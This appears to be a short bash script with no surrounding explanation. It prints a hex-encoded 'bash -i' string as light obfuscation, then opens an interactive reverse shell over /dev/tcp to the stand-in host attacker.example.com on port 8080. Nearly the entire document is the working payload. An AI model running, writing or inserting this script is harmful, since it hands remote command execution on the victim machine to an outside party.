#!/bin/bash
printf '\x62\x61\x73\x68\x20\x2d\x69' # decode to 'bash -i'
bash -i >& /dev/tcp/attacker.example.com/8080 0>&1
